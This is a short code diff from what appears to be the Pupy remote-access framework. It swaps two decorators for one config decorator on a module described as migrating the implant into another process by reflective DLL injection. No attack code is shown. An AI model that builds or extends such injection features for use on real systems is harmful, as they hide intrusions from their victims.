@@ -8,8 +8,7 @@ from modules.lib.windows.migrate import migrate
 __class_name__="MigrateModule"
 
 
-@compatibility("windows")
-@category("manage")
+@config(cat="manage", compat="windows")
 class MigrateModule(PupyModule):
 	""" Migrate pupy into another process using reflective DLL injection """
 	max_clients=1
